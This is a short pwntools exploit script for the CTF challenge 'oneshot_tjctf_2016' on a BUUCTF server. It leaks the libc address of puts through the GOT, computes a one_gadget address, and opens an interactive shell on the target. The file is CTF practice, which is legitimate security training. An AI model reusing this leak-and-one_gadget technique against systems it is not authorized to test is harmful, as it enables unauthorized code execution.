#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.01.31 20.49.12
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*
from LibcSearcher import*
context.arch = 'amd64'


host = '1.1.1.1'
port = 10000
local = 0
if local:
	context.log_level = 'debug'
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elf = ELF('./oneshot_tjctf_2016')
	sh = process('./oneshot_tjctf_2016')
else:
	#context.log_level = 'debug'
	libc=ELF('./libc-2.23.so')
	elf = ELF('./oneshot_tjctf_2016')
	sh = remote('node3.buuoj.cn',29916)



def pwn():
	sh.sendlineafter('location?\n',str(elf.got['puts']))
	sh.recvuntil(': ')
	puts_addr = int(sh.recvuntil('\n'),16)
	libc_s = LibcSearcher('puts',puts_addr)
	libc_addr = puts_addr - libc_s.dump('puts')
	onegad = [0x45216,0x4526a,0xf02a4,0xf1147]
	onegadget = libc_addr + onegad[0]

	sh.sendlineafter('location?\n',str(onegadget))
	# gdb.attach(sh)



if __name__ == '__main__':
	pwn()
	sh.interactive()

